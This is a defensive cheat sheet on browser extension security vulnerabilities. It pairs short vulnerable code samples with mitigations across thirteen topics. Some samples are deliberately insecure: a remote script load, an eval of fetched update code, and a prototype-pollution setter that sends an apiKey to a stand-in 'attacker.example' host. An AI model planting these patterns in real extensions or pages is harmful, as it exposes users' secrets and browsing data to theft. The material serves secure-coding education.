# Browser Extension Security Vulnerabilities Cheat Sheet

## 1. Permissions Overreach

### Vulnerability: Permissions Overreach

Extensions request more permissions than needed → access to all tabs, browsing history, sensitive user data. Compromised extension → serious privacy risk.

### Example: Permissions Overreach

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "permissions": [
    "tabs",
    "storage"
  ],
  "host_permissions": [
    "http://*/*",
    "https://*/*"
  ]
}
```

### Mitigation: Permissions Overreach

Least Privilege (PoLP): request only absolutely necessary permissions. Prefer optional permissions over full upfront access. Regularly audit, remove unneeded permissions. Manifest V3: declare URL access separately in `host_permissions` or `optional_host_permissions`.

## 2. Data Leakage

### Vulnerability: Data Leakage

Extensions unintentionally expose user data by sending browsing activity or personal details to external servers w/o proper security.

### Example: Data Leakage

```javascript
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete') {
    fetch('http://example.com/track', {
      method: 'POST',
      body: JSON.stringify({ URL: tab.URL })
    });
  }
});
```

### Mitigation: Data Leakage

Always HTTPS for all communications to prevent interception. Limit data collection; state collected data clearly in Privacy Policy. Implement user consent before collecting or sending personal data.

## 3. Cross-Site Scripting (XSS)

### Vulnerability: Cross-Site Scripting (XSS)

Unsanitized user input → attackers inject malicious scripts into pages, steal data or perform unauthorized actions.

### Example: Cross-Site Scripting (XSS)

```javascript
let userInput = document.getElementById('input').value;
document.getElementById('output').innerHTML = userInput; // No sanitization
```

### Mitigation: Cross-Site Scripting (XSS)

Implement Content Security Policy (CSP) to block inline scripts. Sanitize user input w/ libraries like DOMPurify before display. Avoid innerHTML; use textContent.

## 4. Insecure Communication

### Vulnerability: Insecure Communication

Sensitive data over unsecured HTTP → interception.

### Example: Insecure Communication

```javascript
fetch('http://example.com/api/data');
```

### Mitigation: Insecure Communication

Always HTTPS for external communications. Validate server responses before processing for data integrity.

## 5. Code Injection

### Vulnerability: Code Injection

Extension dynamically loading scripts from untrusted source → injection and execution of malicious code.

### Example: Code Injection

```javascript
let script = document.createElement('script');
script.src = 'http://example.com/malicious.js';
document.body.appendChild(script);
```

### Mitigation: Code Injection

Use CSP (Content Security Policy) to restrict script sources; see [CSP Cheat Sheet](Content_Security_Policy.md). Avoid eval() and innerHTML (execute malicious code). Prefer extension messaging APIs over injecting scripts into web pages.

## 6. Malicious Updates

### Vulnerability: Malicious Updates

Extension fetching updates from untrusted server → attacker pushes malicious updates to all users.

### Example: Malicious Updates

```javascript
chrome.runtime.onInstalled.addListener(() => {
  fetch('http://example.com/update-script.js')
    .then(response => response.text())
    .then(eval); // Unsafe!
});
```

### Mitigation: Malicious Updates

Sign extension updates w/ digital signatures for authenticity. Rely on extension marketplace updates, not fetching updates within extension.
See "Don’t inject or incorporate remote scripts" (MDN WebExtensions Security best practices).
Integrity checks before executing any fetched code.

## 7. Third-Party Dependencies

### Vulnerability: Third-Party Dependencies

Outdated or vulnerable third-party libraries w/ known exploits → security risk.

### Example: Third-Party Dependencies

```json
{
  "dependencies": {
    "vulnerable-lib": "1.0.0"
  }
}
```

### Mitigation: Third-Party Dependencies

Regularly audit third-party dependencies. Use tools like npm audit or OWASP Dependency-Check. Prefer actively maintained libraries w/ frequent security updates.

## 8. Lack of Content Security Policy (CSP)

### Vulnerability: Lack of Content Security Policy (CSP)

Weakening extension’s CSP increases script injection impact. Chrome enforces default and minimum CSP for Manifest V3 extension pages, even when manifest omits custom policy.

### Example: Restrictive Manifest V3 Policy

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "content_security_policy": {
    "extension_pages": "default-src 'self'; script-src 'self'; object-src 'none';"
  }
}
```

### Mitigation: Lack of Content Security Policy (CSP)

Configure `content_security_policy.extension_pages` in `manifest.json`; load scripts from extension package. Don't apply ordinary webpage nonce or hash recommendations to Chrome Manifest V3 extension pages: allowed script sources restricted. Keep inline script execution blocked; restrict other resource types to what extension needs.

## 9. Insecure Storage

### Vulnerability: Insecure Storage

Sensitive data like auth tokens in localStorage or other unsecured locations → easy attacker access.

### Example: Insecure Storage

```javascript
localStorage.setItem('token', 'my-secret-token'); // No encryption
```

### Mitigation: Insecure Storage

Avoid persisting sensitive user data in extension: extension storage not encrypted. For sensitive data needed only while browser running, use `chrome.storage.session`: stores data in memory, not exposed to content scripts by default. Keep that access restriction; clear data when no longer needed. Reduces persistence and content-script exposure; does not protect secrets from compromised extension or device.
Never hardcode API keys or credentials in extension code.

## 10. Insufficient Privacy Controls

### Vulnerability: Insufficient Privacy Controls

Extension not clearly defining data collection/handling → privacy violations, unauthorized data usage.

### Example: Insufficient Privacy Controls

```json
{
  "manifest_version": 3,
  "name": "My Extension",
  "description": "A cool extension with no privacy policy."
}
```

### Mitigation: Insufficient Privacy Controls

Clear privacy policy explaining data collection practices. Let users opt out of data collection. Disclose data-sharing practices to comply w/ GDPR, CCPA, other privacy regulations.

## 11. DOM-based Data Skimming

### Vulnerability: DOM-based Data Skimming

Extension rendering sensitive user info directly into page DOM → data accessible to page's own scripts.

Applies regardless of method: plain JavaScript DOM manipulation or injecting framework components like React.

Malicious or compromised page can inspect DOM, read sensitive data (e.g., PII, financial details, AI chat histories), exfiltrate it.

### Example: DOM-based Data Skimming

```javascript
// content-script.js

// Sensitive data fetched from the extension's background service
const userData = {
  name: "Jane Doe",
  email: "jane.doe@example.com"
};

// This injects sensitive data directly into the page's DOM
const userInfoDiv = document.createElement('div');
userInfoDiv.innerText = `name: ${userData.name}, email: ${userData.email}`;
document.body.appendChild(userInfoDiv);
```

### Mitigation: DOM-based Data Skimming

Never render sensitive info directly into page DOM. Display in extension-controlled UI elements isolated from page context.

Secure alternatives:

- Popup: UI shown when user clicks extension icon.
- Options Page: dedicated page for user-specific data or settings.
- Side Panel: persistent UI in separate pane, isolated from page content. ("Side Panel" = Chromium term; Firefox calls it "Sidebar".)

Shadow DOM encapsulation insufficient: page scripts can still query 'open' Shadow DOM. 'Closed' Shadow DOM also unsafe if other browser extensions are threats in security model: extensions can pierce 'closed' Shadow DOM via `openOrClosedShadowRoot()` API.

Truly separate extension-controlled UIs = most reliable mitigation.

## 12. Prototype-based Data Skimming

### Vulnerability: Prototype-based Data Skimming

Content script runs in "isolated world", JavaScript context separate from page's. Extensions can also run scripts in "main world" (page's context), e.g. inject `<script>` tag into DOM w/ `src` pointing to a script of web accessible resources.

Sensitive user info used in scripts executed in page context → accessible to page's scripts. Compromised or malicious page steals data.

Cause: global objects of a context (aka "built-in objects", "primordials", "prototypes") can be overwritten to behave differently ("prototype pollution", "prototype overriding").

Malicious or compromised page can overwrite global objects in its context to steal data they handle. Objects include almost everything in context, e.g. functions. Extension's injected script using overwritten objects w/ sensitive data inadvertently triggers malicious code → exfiltration.

### Example: Prototype-based Data Skimming

```javascript
// Malicious script overwriting all objects' setter for 'apiKey'
// to send the value to be set towards a server.
Object.defineProperty(Object.prototype, 'apiKey', {
    set: function (str) {
        fetch(`https://attacker.example?data=${str}`);
        Object.defineProperty(this, 'apiKey', {
            value: str
        })
        return str
    }
})

// Extension's script to be executed on a web page's context.
window.addEventListener('message', (data) => {
  if (data.apiKey) {
    // the setter for 'apiKey' is already polluted,
    // and the below line triggers malicious code and the data is immediately sent.
    window.apiController.apiKey = data.apiKey;
  }
})
```

### Mitigation: Prototype-based Data Skimming

Don't use page's context when handling sensitive user info, even briefly. If communication w/ page-context scripts necessary, pass only non-sensitive, essential info. E.g. pass just validation result, not whole secret token. Applies even to `window.postMessage`: can be overwritten too, malicious scripts can add listeners for `message` event.

Don't try to obtain native (not-overwritten) prototypes via tricks. Hacks exist to get native prototypes where other scripts also run, but bypasses (forcing other scripts to use overwritten prototypes) often invented.

Don't assume extension script gets native prototypes even at `document_start`. In Chromium extensions, newly created iframe's context can be tweaked by page's script BEFORE extension's script starts in iframe even at `document_start` (official Chromium bug issue).

## 13. Insecure Message Passing

### Vulnerability: Insecure Message Passing

Extensions rely on message passing (`chrome.runtime.sendMessage/onMessage`) between low-privilege contexts (Content Scripts, Popup) and high-privilege Service Worker (Background). Service Worker not validating sender's origin or URL → compromised webpage sends malicious messages, tricks extension into privileged actions (e.g., retrieving sensitive data or API keys).

### Example: Insecure Message Passing

```javascript
// In Service Worker (Background)
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === 'fetchSecret') { // No validation of sender
    // A malicious content script/webpage could trigger this.
    fetch(SECRET_API_URL);
  }
});
```

### Mitigation: Insecure Message Passing

Treat all incoming messages as untrusted input.
In Service Workers, always:

- Validate `sender.id`: message originates from own extension.
- Validate `sender.url` or `sender.origin`: restrict which extension pages or content scripts may communicate.
- Avoid letting webpages indirectly influence privileged logic through content scripts.
- Strict validation and allow-listing of `request.action` and all request parameters.

Chrome states content scripts less trustworthy than extension pages; treat accordingly. Secure example:

```javascript
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (sender.id !== chrome.runtime.id) return;
  if (!sender.url?.startsWith('chrome-extension://')) return;

  if (request.action === 'fetchSecret') {
    fetch(SECRET_API_URL);
  }
});
```

## References

- Chrome Extensions: Stay Secure
- MDN: WebExtension Security Best Practices
